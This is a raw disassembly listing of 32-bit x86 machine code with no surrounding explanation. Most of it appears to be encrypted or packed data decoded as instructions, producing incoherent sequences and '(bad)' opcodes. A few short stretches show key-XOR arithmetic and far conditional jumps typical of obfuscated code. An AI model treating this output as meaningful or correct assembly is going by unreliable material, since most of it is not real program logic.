  40d02b:	retf   0x7c79
  40d02e:	jl     0x40d01c
  40d030:	scas   eax,DWORD PTR es:[edi]
  40d031:	inc    eax
  40d032:	mov    WORD PTR [esi-0x32563c34],fs
  40d038:	shr    BYTE PTR [ebx],cl
  40d03a:	scas   al,BYTE PTR es:[edi]
  40d03b:	push   ds
  40d03c:	sub    al,0x40
  40d03e:	fidivr DWORD PTR fs:[ebp+0xf464329]
  40d045:	jmp    0xb6e697d1
  40d04a:	and    eax,0x29554224
  40d04f:	push   ebx
  40d050:	ficomp DWORD PTR [eax]
  40d052:	sbb    eax,0xcc224d00
  40d057:	retf   
  40d058:	in     eax,0x10
  40d05a:	sub    ebp,DWORD PTR [edx+0x4f]
  40d05d:	cmp    BYTE PTR gs:[edi+0x6b0816a3],dl
  40d064:	mov    ch,ch
  40d066:	push   esp
  40d067:	mov    ah,0x28
  40d069:	mov    ecx,0xc915be89
  40d06e:	xchg   edi,eax
  40d06f:	fistp  WORD PTR [ebx]
  40d071:	push   ebx
  40d072:	stos   BYTE PTR es:[edi],al
  40d073:	mov    eax,0xa65a085e
  40d078:	dec    edx
  40d079:	fdivr  st,st(3)
  40d07b:	xchg   esp,eax
  40d07c:	push   0x1c
  40d07e:	ss push ecx
  40d080:	inc    eax
  40d081:	arpl   cx,dx
  40d083:	push   0x51e9f42b
  40d088:	test   BYTE PTR [eax-0x4ac428a2],dl
  40d08e:	mov    esp,0x40d8b354
  40d093:	in     eax,dx
  40d094:	xchg   esp,eax
  40d095:	loopne 0x40d0d5
  40d097:	pushf  
  40d098:	cmp    al,0x7d
  40d09a:	jae    0x40d05e
  40d09c:	cmp    DWORD PTR [ebx],ebx
  40d09e:	pop    ds
  40d09f:	es push 0xffffffd2
  40d0a2:	xor    bl,al
  40d0a4:	mov    eax,ds:0x1940a4a6
  40d0a9:	outs   dx,BYTE PTR ds:[esi]
  40d0aa:	rol    cl,cl
  40d0ac:	and    bh,BYTE PTR [esi-0x16]
  40d0af:	mov    edx,0x92704521
  40d0b4:	add    eax,0x32528378
  40d0b9:	add    bh,BYTE PTR [ecx]
  40d0bb:	pop    ds
  40d0bc:	clc    
  40d0bd:	mov    bl,0xf9
  40d0bf:	and    DWORD PTR [esi-0x18b08154],edx
  40d0c5:	pop    ecx
  40d0c6:	data16 sub BYTE PTR [esi-0x28],0xb9
  40d0cb:	mov    DWORD PTR [edx+0x21],edi
  40d0ce:	or     al,0xbb
  40d0d0:	fnstcw WORD PTR [eax]
  40d0d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0d3:	stos   DWORD PTR es:[edi],eax
  40d0d4:	pop    esi
  40d0d5:	add    esi,edx
  40d0d7:	mov    ds:0xbcdbb32b,eax
  40d0dc:	jne    0x40d071
  40d0de:	and    edi,ecx
  40d0e0:	ds push edi
  40d0e2:	adc    ebx,DWORD PTR [ebp-0xc]
  40d0e5:	jne    0x40d085
  40d0e7:	ds sub dh,bh
  40d0ea:	mov    ecx,0x178a9765
  40d0ef:	(bad)  
  40d0f0:	retf   
  40d0f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0f2:	ds adc al,0xc2
  40d0f5:	inc    edx
  40d0f6:	sub    bl,al
  40d0f8:	and    al,0x69
  40d0fa:	retf   
  40d0fb:	lock lock mov al,ds:0x11d54088
  40d102:	sub    BYTE PTR [ecx-0xd8064ec],0xac
  40d109:	ret    
  40d10a:	mov    dh,0xa5
  40d10c:	inc    edx
  40d10d:	pop    edx
  40d10e:	hlt    
  40d10f:	mov    ecx,0xa28c8977
  40d114:	mov    edx,0xfa1bc721
  40d119:	loope  0x40d0e5
  40d11b:	fwait
  40d11c:	sub    eax,0x19b244d3
  40d121:	mov    edi,DWORD PTR [esi+0x7957123d]
  40d127:	dec    ebx
  40d128:	sub    eax,0x4abae08b
  40d12d:	xor    al,0x96
  40d12f:	fisttp QWORD PTR [ebx]
  40d131:	pop    eax
  40d132:	pop    ebp
  40d133:	out    0xe2,al
  40d135:	test   DWORD PTR [edi],eax
  40d137:	pushf  
  40d138:	cmp    ch,BYTE PTR [ebx+0x58]
  40d13b:	xor    al,0x28
  40d13d:	xor    al,0x44
  40d13f:	nop
  40d140:	retf   0x566b
  40d143:	mov    ds:0xcedcec25,al
  40d148:	mov    eax,ds:0x201a240e
  40d14d:	push   esp
  40d14e:	(bad)  
  40d14f:	repz repz xor BYTE PTR [eax],al
  40d153:	dec    esi
  40d154:	aaa    
  40d155:	dec    esi
  40d156:	sbb    bl,cl
  40d158:	push   esi
  40d159:	cmc    
  40d15a:	pop    edi
  40d15b:	or     ebp,edx
  40d15d:	cmc    
  40d15e:	sbb    al,dh
  40d160:	js     0x40d15c
  40d162:	cmp    dh,BYTE PTR [edx]
  40d164:	dec    ebp
  40d165:	into   
  40d166:	pop    ecx
  40d167:	rcr    dl,1
  40d169:	loop   0x40d119
  40d16b:	jae    0x40d1d0
  40d16d:	jg     0x40d1a9
  40d16f:	or     bh,bh
  40d171:	inc    eax
  40d172:	add    BYTE PTR [ecx],bl
  40d174:	adc    ebp,DWORD PTR [eax]
  40d176:	jnp    0x40d1b3
  40d178:	adc    eax,0xf46fb1b7
  40d17d:	cld    
  40d17e:	enter  0x9648,0x17
  40d182:	mov    dh,0x2b
  40d184:	push   0x1d
  40d186:	(bad)  [eax-0x5b]
  40d189:	rcl    BYTE PTR [ebp-0x43],1
  40d18c:	adc    BYTE PTR [esi-0xcb475bf],ch
  40d192:	push   edx
  40d193:	leave  
  40d194:	xor    DWORD PTR [edx+0x726e12f8],esi
  40d19a:	or     BYTE PTR [edi+0x26223c00],dh
  40d1a0:	stos   DWORD PTR es:[edi],eax
  40d1a1:	pop    esi
  40d1a2:	jg     0x40d1da
  40d1a4:	lods   eax,DWORD PTR ds:[esi]
  40d1a5:	ins    BYTE PTR es:[edi],dx
  40d1a6:	mov    DWORD PTR [ebp+0x66],ebx
  40d1a9:	mov    ah,0x7d
  40d1ab:	jmp    0x40d225
  40d1ad:	pop    es
  40d1ae:	test   DWORD PTR [esp+ebp*2],0xd7c8ead6
  40d1b5:	mov    edx,0x2b6a368b
  40d1ba:	xchg   ecx,eax
  40d1bb:	mov    ch,0xf5
  40d1bd:	mov    ?,esp
  40d1bf:	shl    DWORD PTR [esi],cl
  40d1c1:	push   0xe8cc4c85
  40d1c6:	and    al,0xa8
  40d1c8:	xchg   esi,ebx
  40d1ca:	pop    ebp
  40d1cb:	adc    eax,esi
  40d1cd:	dec    esp
  40d1ce:	mov    BYTE PTR [ecx],bl
  40d1d0:	jne    0x40d24e
  40d1d2:	es jg  0x40d220
  40d1d5:	aad    0x7e
  40d1d7:	in     eax,dx
  40d1d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d9:	cmp    al,0xa5
  40d1db:	push   0xc833b2b5
  40d1e0:	pusha  
  40d1e1:	add    al,0xf6
  40d1e3:	jo     0x40d246
  40d1e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1e6:	pop    ebx
  40d1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ea:	sub    bl,BYTE PTR [ecx-0x65]
  40d1ed:	ret    0xc6b
  40d1f0:	pop    esi
  40d1f1:	stos   DWORD PTR es:[edi],eax
  40d1f2:	adc    ecx,DWORD PTR [edi-0x12]
  40d1f5:	daa    
  40d1f6:	sub    al,BYTE PTR [ebx+0x72]
  40d1f9:	mov    cl,0x50
  40d1fb:	adc    BYTE PTR [esi+0x74f924ac],bh
  40d201:	lahf   
  40d202:	xchg   ecx,eax
  40d203:	(bad)  
  40d205:	and    DWORD PTR [ecx*1-0x2b9192a1],eax
  40d20c:	mov    ah,0x1d
  40d20e:	pop    ebx
  40d20f:	mov    edi,esi
  40d211:	cmp    edi,esp
  40d213:	test   ecx,ebx
  40d215:	xchg   ebp,eax
  40d216:	cmp    BYTE PTR [ecx-0x2ea517c7],ah
  40d21c:	arpl   WORD PTR [eax+ebx*8],dx
  40d21f:	jae    0x40d206
  40d221:	ins    DWORD PTR es:[edi],dx
  40d222:	lock xchg ecx,eax
  40d224:	sbb    eax,0x67b01a27
  40d229:	icebp  
  40d22a:	fdiv   QWORD PTR [esi-0x2892e67e]
  40d230:	pop    ebp
  40d231:	outs   dx,DWORD PTR ds:[esi]
  40d232:	cdq    
  40d233:	mov    bl,0xa6
  40d235:	jmp    0x76d3dc43
  40d23a:	fs cwde 
  40d23c:	sbb    ebx,ecx
  40d23e:	inc    esi
  40d23f:	bound  esp,QWORD PTR [esi-0x2c]
  40d242:	jg     0x40d1f4
  40d244:	sub    al,0x35
  40d246:	(bad)  
  40d247:	jns    0x40d22a
  40d249:	inc    edx
  40d24a:	sub    edi,ecx
  40d24c:	mov    ds,WORD PTR [ebp+0x39]
  40d24f:	adc    ah,ah
  40d251:	mov    al,ds:0x3f8c4eb5
  40d256:	inc    ebx
  40d257:	fcomp  DWORD PTR [ebx]
  40d259:	jae    0x40d288
  40d25b:	inc    esp
  40d25c:	inc    cl
  40d25e:	popa   
  40d25f:	xor    eax,0x22c449ea
  40d264:	call   0xab5f621e
  40d269:	pop    edx
  40d26a:	mov    ah,0x27
  40d26c:	jl     0x40d257
  40d26e:	clc    
  40d26f:	jno    0x40d2b2
  40d271:	mov    ecx,0xfa40b9b9
  40d276:	xor    eax,0x52f4768
  40d27b:	dec    ebx
  40d27c:	and    ebx,edi
  40d27e:	add    ebp,DWORD PTR [edi-0x552d70b5]
  40d284:	pop    ebx
  40d285:	mov    bl,0xd8
  40d287:	or     dh,BYTE PTR [edi+0x11c1273]
  40d28d:	cmp    ah,BYTE PTR [ecx-0x23b79abd]
  40d293:	push   edi
  40d294:	mul    BYTE PTR [esi+ebx*2+0x23bd41a]
  40d29b:	addr16 retf 
  40d29d:	push   edi
  40d29e:	dec    edi
  40d29f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2a0:	(bad)  
  40d2a1:	frstor [eax-0x44]
  40d2a4:	mov    eax,0xaa76c72b
  40d2a9:	daa    
  40d2aa:	or     eax,0x299fe5af
  40d2af:	mov    al,0x17
  40d2b1:	and    eax,DWORD PTR [ebp+0x3dbb9e76]
  40d2b7:	push   ecx
  40d2b8:	sar    DWORD PTR [ebx-0x6b47f40a],cl
  40d2be:	mov    edx,0xcbfd6b0a
  40d2c3:	mov    ch,0x21
  40d2c5:	mov    ds:0x119ffbf3,eax
  40d2ca:	sbb    DWORD PTR [ebx-0x57],edx
  40d2cd:	fcmovnb st,st(0)
  40d2cf:	and    esi,DWORD PTR [esi-0x5a4cf431]
  40d2d5:	sub    al,0x8e
  40d2d7:	pop    ebp
  40d2d8:	and    DWORD PTR [ebp+0x2a],esi
  40d2db:	xor    esp,ecx
  40d2dd:	daa    
  40d2de:	in     al,dx
  40d2df:	rep outs dx,BYTE PTR ds:[esi]
  40d2e1:	adc    BYTE PTR [edx],al
  40d2e3:	jns    0x40d2bc
  40d2e5:	lea    ebx,[esi+0x2f]
  40d2e8:	inc    eax
  40d2e9:	xor    al,0xe4
  40d2eb:	loop   0x40d312
  40d2ed:	or     al,0x4
  40d2ef:	cmp    ebx,DWORD PTR [ebx+0x1a]
  40d2f2:	les    edx,FWORD PTR [ebx+0x28]
  40d2f5:	dec    ebp
  40d2f6:	(bad)  
  40d2f8:	int    0x13
  40d2fa:	pushf  
  40d2fb:	push   edx
  40d2fc:	and    ch,bl
  40d2fe:	jo     0x40d28c
  40d300:	jmp    0x40d284
  40d302:	pop    edx
  40d303:	sbb    bh,BYTE PTR [edx-0x21]
  40d306:	pop    ds
  40d307:	out    0xd8,al
  40d309:	and    edi,esi
  40d30b:	mov    ebx,0x843ee1a3
  40d310:	push   esi
  40d311:	mov    eax,ds:0xb98f1432
  40d316:	loop   0x40d379
  40d318:	call   FWORD PTR [ebx+0x54]
  40d31b:	ds je  0x40d2b5
  40d31e:	clc    
  40d31f:	mov    dl,0x75
  40d321:	mov    bh,0xce
  40d323:	pop    eax
  40d324:	push   ecx
  40d325:	mul    BYTE PTR [ebx+edi*8]
  40d328:	in     al,dx
  40d329:	jge    0x40d2bd
  40d32b:	adc    bl,BYTE PTR [ebp-0x32]
  40d32e:	add    ch,ah
  40d330:	pushf  
  40d331:	inc    edx
  40d332:	fwait
  40d333:	xchg   ecx,eax
  40d334:	sbb    cl,dh
  40d336:	mov    eax,0x55c53f89
  40d33b:	cmp    BYTE PTR [eax+0x4c96578e],bl
  40d341:	dec    esi
  40d342:	lods   eax,DWORD PTR gs:[esi]
  40d344:	adc    edi,DWORD PTR [edx+esi*1+0x26f78903]
  40d34b:	xor    esi,ebx
  40d34d:	or     bh,bh
  40d34f:	js     0x40d30e
  40d351:	outs   dx,BYTE PTR ds:[esi]
  40d352:	adc    edi,DWORD PTR [esi+0x54]
  40d355:	and    DWORD PTR [edi+0x0],ecx
  40d358:	adc    DWORD PTR [ecx+0x1f],ebx
  40d35b:	imul   edi,DWORD PTR [edi+0x7b4fa314],0x8967c28e
  40d365:	and    eax,0x1a1743fd
  40d36a:	mov    ch,0x8a
  40d36c:	imul   edx,DWORD PTR [ecx+0x7c],0xc
  40d370:	mov    edi,es
  40d372:	hlt    
  40d373:	fcomp  st(1)
  40d375:	aaa    
  40d376:	je     0x40d32c
  40d378:	fiadd  WORD PTR gs:[eax+0x54]
  40d37c:	fistp  DWORD PTR [ebx+ebp*4]
  40d37f:	or     cl,BYTE PTR [edx+0xe]
  40d382:	data16 xor al,0xcc
  40d385:	mov    edi,DWORD PTR [ebp-0xc]
  40d388:	xor    edi,eax
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	adc    BYTE PTR [eax],bh
  40d3c8:	xor    BYTE PTR [eax+0x6f],bl
  40d3cb:	cwde   
  40d3cc:	jl     0x40d44a
  40d3ce:	retf   0x7c79
  40d3d1:	jl     0x40d3ee
  40d3d3:	or     BYTE PTR [edi],dh
  40d3d5:	nop
  40d3d6:	pop    esp
  40d3d7:	shr    DWORD PTR ds:0x6237ed62,0x30
  40d3de:	jg     0x40d402
  40d3e0:	push   es
  40d3e1:	in     eax,dx
  40d3e2:	mov    bl,0xf2
  40d3e4:	push   esi
  40d3e5:	jecxz  0x40d392
  40d3e7:	xchg   esp,eax
  40d3e8:	sub    DWORD PTR [eax+0x24],ebp
  40d3eb:	aam    0x29
  40d3ed:	mov    esi,0xa7a93685
  40d3f2:	mov    DWORD PTR ds:0x60a183d2,0x22430e51
  40d3fc:	popa   
  40d3fd:	in     eax,dx
  40d3fe:	jmp    0x675f:0xca77b2f3
  40d405:	and    al,0x47
  40d407:	stos   BYTE PTR es:[edi],al
  40d408:	enter  0x8387,0x93
  40d40c:	xor    eax,0x77610c42
  40d411:	mov    bh,0x6
  40d413:	sbb    BYTE PTR [ecx],bh
  40d415:	pop    ss
  40d416:	outs   dx,BYTE PTR ds:[esi]
  40d417:	mov    cl,0x4f
  40d419:	fdivr  QWORD PTR [edx]
  40d41b:	(bad)  [eax+0x58192bc5]
  40d421:	jge    0x40d45d
  40d423:	mov    ecx,0xb7fc99f3
  40d428:	mov    ecx,0x8646834c
  40d42d:	sub    ah,BYTE PTR [ecx]
  40d42f:	mov    al,gs:0x81c67e4f
  40d435:	in     al,dx
  40d436:	and    eax,0x4bbedb95
  40d43b:	mov    eax,ds:0xc07d953e
  40d440:	loope  0x40d4b5
  40d442:	push   ds
  40d443:	in     al,0xa3
  40d445:	loope  0x40d412
  40d447:	jns    0x40d453
  40d449:	cmp    al,0x9d
  40d44b:	sbb    DWORD PTR [edi+0x31],ecx
  40d44e:	clc    
  40d44f:	fnstsw WORD PTR [eax]
  40d451:	test   BYTE PTR [ebx+0x733e9732],bh
  40d457:	test   al,0x8c
  40d459:	pop    esi
  40d45a:	cdq    
  40d45b:	lock dec edx
  40d45d:	nop
  40d45e:	mov    al,ds:0xa2f019b0
  40d463:	lahf   
  40d464:	dec    esp
  40d465:	push   esp
  40d466:	imul   esi,DWORD PTR [edx],0xffffffd0
  40d469:	das    
  40d46a:	mov    WORD PTR [ecx],ss
  40d46c:	push   edx
  40d46d:	xchg   BYTE PTR [eax-0xae9ce9b],bl
  40d473:	and    DWORD PTR [edx],0x6e
  40d476:	mov    ebp,0xf6ecc907
  40d47b:	jmp    0x84997d67
  40d480:	in     al,0x1d
  40d482:	daa    
  40d483:	fwait
  40d484:	nop
  40d485:	mov    eax,ds:0xceacf165
  40d48a:	sbb    DWORD PTR [ecx+edi*4],0x55b38daa
  40d491:	xchg   ecx,eax
  40d492:	dec    esi
  40d493:	and    dl,BYTE PTR [edx]
  40d495:	xor    esp,DWORD PTR ds:0x39c4e156
  40d49b:	sub    BYTE PTR [ecx-0x6ca1a8bf],dl
  40d4a1:	jns    0x40d506
  40d4a3:	pusha  
  40d4a4:	sbb    dl,BYTE PTR [edx-0x5701e7c0]
  40d4aa:	mov    ds:0x514cc681,eax
  40d4af:	ficomp DWORD PTR [edx-0x2257bf67]
  40d4b5:	cmp    eax,DWORD PTR [edi]
  40d4b7:	or     BYTE PTR [edx+0x4fe29ae4],0x30
  40d4be:	and    al,0x38
  40d4c0:	int3   
  40d4c1:	retf   
  40d4c2:	stos   DWORD PTR es:[edi],eax
  40d4c3:	and    bl,BYTE PTR [ebp-0x4a]
  40d4c6:	cli    
  40d4c7:	adc    al,0x9f
  40d4c9:	shl    esp,1
  40d4cb:	sti    
  40d4cc:	cmc    
  40d4cd:	push   0xffffffd9
  40d4cf:	lods   eax,DWORD PTR ds:[esi]
  40d4d0:	sub    al,0x1a
  40d4d2:	adc    al,0x3b
  40d4d4:	fbstp  TBYTE PTR ds:0xffa0fb00
  40d4da:	js     0x40d541
  40d4dc:	outs   dx,DWORD PTR ds:[esi]
  40d4dd:	mov    ebp,0xb3fc91c0
  40d4e2:	sar    DWORD PTR [ecx+ebx*8],1
  40d4e5:	test   eax,0xf33d12ad
  40d4ea:	push   edx
  40d4eb:	sar    BYTE PTR [ecx],cl
  40d4ed:	scas   eax,DWORD PTR es:[edi]
  40d4ee:	imul   ecx,DWORD PTR [ecx+0x7a],0xffffffee
  40d4f2:	or     BYTE PTR [eax-0x3c4661b9],bl
  40d4f8:	and    BYTE PTR [ecx-0x2745802f],ch
  40d4fe:	fisubr DWORD PTR [esi]
  40d500:	add    dh,ah
  40d502:	loope  0x40d516
  40d504:	add    ah,BYTE PTR [ecx]
  40d506:	mov    bl,0xf8
  40d508:	jae    0x40d4df
  40d50a:	jle    0x40d516
  40d50c:	(bad)  
  40d50d:	js     0x40d4e8
  40d50f:	mov    edi,0x5a5946c2
  40d514:	and    ecx,esi
  40d516:	jmp    0xcb5266ce
  40d51b:	push   0xfffffff6
  40d51d:	out    dx,al
  40d51e:	cmp    eax,0xf0c4b106
  40d523:	addr16 test eax,0x82aeb52e
  40d529:	dec    ebp
  40d52a:	out    0xfb,al
  40d52c:	fsub   QWORD PTR [esi+0x3957d345]
  40d532:	setb   ch
  40d535:	jmp    0x1133:0x575f25b7
  40d53c:	fild   QWORD PTR [edx-0x3e]
  40d53f:	jl     0x40d4d6
  40d541:	cs rol ebx,cl
  40d544:	sbb    bl,BYTE PTR [edi]
  40d546:	aam    0x56
  40d548:	in     eax,0x2f
  40d54a:	sub    BYTE PTR [bp+0x19],dh
  40d54e:	adc    al,0xb5
  40d550:	ds pop ss
  40d552:	leave  
  40d553:	xor    al,0x6a
  40d555:	adc    BYTE PTR [eax-0x34ec65fb],al
  40d55b:	std    
  40d55c:	pop    ebx
  40d55d:	pop    esi
  40d55e:	ret    0xe3b8
  40d561:	mov    dl,0x3
  40d563:	and    edi,eax
  40d565:	pushf  
  40d566:	dec    ebx
  40d567:	test   ch,ch
  40d569:	push   ss
  40d56a:	lods   al,BYTE PTR ds:[esi]
  40d56b:	lods   eax,DWORD PTR ds:[esi]
  40d56c:	dec    ebx
  40d56d:	jne    0x40d5c2
  40d56f:	sub    ebp,esi
  40d571:	addr16 dec edi
  40d573:	jg     0x40d590
  40d575:	mov    ah,0xf3
  40d577:	xchg   edi,eax
  40d578:	or     al,0x67
  40d57a:	fwait
  40d57b:	in     eax,dx
  40d57c:	pop    ss
  40d57d:	out    dx,al
  40d57e:	pop    edi
  40d57f:	push   esi
  40d580:	outs   dx,BYTE PTR ds:[esi]
  40d581:	mov    ds:0xa79396ee,al
  40d586:	sbb    DWORD PTR [edi],edx
  40d588:	lock sub ah,ch
  40d58b:	aad    0xfb
  40d58d:	xchg   edx,eax
  40d58e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d58f:	sbb    ebp,DWORD PTR [esi*4-0x34cdc092]
  40d596:	rol    esi,cl
  40d598:	ins    BYTE PTR es:[edi],dx
  40d599:	sub    al,0x86
  40d59b:	push   ebp
  40d59c:	int3   
  40d59d:	fdiv   DWORD PTR ds:0x1ffa438a
  40d5a3:	dec    ecx
  40d5a4:	aas    
  40d5a5:	push   edi
  40d5a6:	jmp    0x79cdcab
  40d5ab:	pop    esi
  40d5ac:	jne    0x40d5d2
  40d5ae:	pop    es
  40d5af:	cmp    al,0x2b
  40d5b1:	enter  0x5937,0x46
  40d5b5:	cwde   
  40d5b6:	std    
  40d5b7:	imul   ebx,edi,0xa1302012
  40d5bd:	mov    dl,0xdb
  40d5bf:	ins    DWORD PTR es:[edi],dx
  40d5c0:	fdivr  st,st(0)
  40d5c2:	sub    BYTE PTR [esi],ah
  40d5c4:	or     DWORD PTR [eax-0x10],ebx
  40d5c7:	mov    WORD PTR [edi+0x11],cs
  40d5ca:	nop
  40d5cb:	or     DWORD PTR [ebx-0x74c4e732],eax
  40d5d1:	imul   esi,DWORD PTR gs:[ebx],0xf3a169a7
  40d5d8:	mov    al,0x9a
  40d5da:	sub    ch,BYTE PTR [ecx-0x34be4cb5]
  40d5e0:	pop    ss
  40d5e1:	das    
  40d5e2:	or     DWORD PTR [edi],ebx
  40d5e4:	jle    0x40d5a8
  40d5e6:	inc    ebx
  40d5e7:	or     al,0x11
  40d5e9:	ret    
  40d5ea:	ins    DWORD PTR es:[edi],dx
  40d5eb:	add    esp,esi
  40d5ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ee:	pop    ss
  40d5ef:	icebp  
  40d5f0:	outs   dx,BYTE PTR ds:[esi]
  40d5f1:	push   esi
  40d5f2:	jne    0x40d5bf
  40d5f4:	inc    ebp
  40d5f5:	and    BYTE PTR [ecx],bh
  40d5f7:	jp     0x40d5ee
  40d5f9:	mov    eax,DWORD PTR [edx+eiz*2]
  40d5fc:	mov    ch,0xc8
  40d5fe:	test   eax,0xa9143b6
  40d603:	or     ecx,edx
  40d605:	stos   BYTE PTR es:[edi],al
  40d606:	jae    0x40d5e9
  40d608:	test   al,0xf9
  40d60a:	push   ebx
  40d60b:	and    edx,ecx
  40d60d:	mov    ecx,DWORD PTR [esi-0x13]
  40d610:	jo     0x40d656
  40d612:	xchg   DWORD PTR [edx+ebp*1-0xa],edx
  40d616:	mov    bh,0x53
  40d618:	and    dl,0xd0
  40d61b:	inc    ebx
  40d61c:	jno    0x40d5fa
  40d61e:	jmp    0x40d671
  40d620:	mov    WORD PTR [ebx-0x16],?
  40d623:	inc    edi
  40d624:	xchg   esi,eax
  40d625:	cwde   
  40d626:	sub    edx,DWORD PTR [eax+0x138dff13]
  40d62c:	dec    edi
  40d62d:	inc    esp
  40d62e:	sub    DWORD PTR [ebx+0x45],0x15
  40d632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d633:	popa   
  40d634:	sbb    ebx,DWORD PTR [ebx+0x19]
  40d637:	cld    
  40d638:	sahf   
  40d639:	cdq    
  40d63a:	pop    ds
  40d63b:	out    dx,eax
  40d63c:	out    dx,eax
  40d63d:	pop    ebp
  40d63e:	sahf   
  40d63f:	adc    DWORD PTR [esi],0x7c4ca58
  40d645:	cwde   
  40d646:	dec    ebx
  40d647:	(bad)  
  40d648:	fcmovnbe st,st(4)
  40d64a:	loope  0x40d60c
  40d64c:	sub    ecx,esi
  40d64e:	xchg   BYTE PTR [esp],ah
  40d651:	jg     0x40d68b
  40d653:	ret    0xa52f
  40d656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d657:	inc    esi
  40d658:	push   edi
  40d659:	xor    DWORD PTR [ebx+0x3edda047],edi
  40d65f:	imul   ebp,DWORD PTR ds:0xe64bef89,0xe244100f
  40d669:	(bad)  
  40d66a:	call   0x5ef07b42
  40d66f:	int    0x60
  40d671:	dec    edi
  40d672:	push   0xffffff89
  40d674:	and    ecx,eax
  40d676:	or     bh,BYTE PTR [ebp+0x3733a176]
  40d67c:	or     eax,0xfa0feeb3
  40d681:	jb     0x40d6c5
  40d683:	ret    
  40d684:	(bad)  
  40d686:	dec    ebx
  40d687:	stos   BYTE PTR es:[edi],al
  40d688:	sahf   
  40d689:	lds    esi,FWORD PTR [edi+0xf]
  40d68c:	test   BYTE PTR [ebp-0x14],dl
  40d68f:	sbb    al,0x52
  40d691:	jg     0x40d69f
  40d693:	pop    ecx
  40d694:	adc    eax,ecx
  40d696:	fcomp  st(7)
  40d698:	mov    bl,0x85
  40d69a:	inc    edx
  40d69b:	jge    0x40d627
  40d69d:	cmp    al,0x2
  40d69f:	retf   0x4d3b
  40d6a2:	push   edi
  40d6a3:	in     eax,0x9d
  40d6a5:	sub    eax,0x64739c5a
  40d6aa:	out    0x24,al
  40d6ac:	clc    
  40d6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ae:	pop    ecx
  40d6af:	popa   
  40d6b0:	icebp  
  40d6b1:	inc    ecx
  40d6b2:	add    DWORD PTR [esi-0x501e7267],edx
  40d6b8:	and    DWORD PTR [edx],edi
  40d6ba:	aaa    
  40d6bb:	mov    esi,0x7a7e16e9
  40d6c0:	pop    ecx
  40d6c1:	jmp    0x40d656
  40d6c3:	mov    WORD PTR [eax+0x13ee1426],?
  40d6c9:	xor    al,0xf2
  40d6cb:	xlat   BYTE PTR ds:[ebx]
  40d6cc:	aad    0xe0
  40d6ce:	daa    
  40d6cf:	sbb    bl,BYTE PTR [edx]
  40d6d1:	cli    
  40d6d2:	daa    
  40d6d3:	inc    eax
  40d6d4:	sub    BYTE PTR [ebx+edi*4+0x4c],0xb4
  40d6d9:	push   ss
  40d6da:	mov    eax,ds:0xb742a9b5
  40d6df:	test   esi,esp
  40d6e1:	sbb    edx,0x29558965
  40d6e7:	scas   al,BYTE PTR es:[edi]
  40d6e8:	xchg   edx,eax
  40d6e9:	fild   QWORD PTR [ebx+0x905ab30]
  40d6ef:	sub    al,0x43
  40d6f1:	ins    DWORD PTR es:[edi],dx
  40d6f2:	enter  0x5832,0x3d
  40d6f6:	jno    0x40d6df
  40d6f8:	aaa    
  40d6f9:	je     0x40d6a4
  40d6fb:	inc    edi
  40d6fc:	and    bl,0x74
  40d6ff:	inc    esi
  40d700:	and    dh,BYTE PTR [ebx+0x5c]
  40d703:	mov    cl,0x75
  40d705:	out    dx,eax
  40d706:	cdq    
  40d707:	repz les ebp,FWORD PTR [esi+0x1cb78bb0]
  40d70e:	(bad)  
  40d710:	stc    
  40d711:	push   ecx
  40d712:	push   eax
  40d713:	(bad)  
  40d714:	imul   edi,ebp,0x3f
  40d717:	dec    edx
  40d718:	imul   esp,DWORD PTR [ebx],0x6
  40d71b:	pop    ebp
  40d71c:	rol    DWORD PTR [esi-0x2e],0x48
  40d720:	xor    esp,DWORD PTR [ebx]
  40d722:	xor    esp,ebx
  40d724:	jg     0x40d71a
  40d726:	mov    ds:0x3d033a7,al
  40d72b:	ror    DWORD PTR [edi],1
  40d72d:	scas   eax,DWORD PTR es:[edi]
  40d72e:	xlat   BYTE PTR ds:[ebx]
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43361b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x4335e3,0x6b43
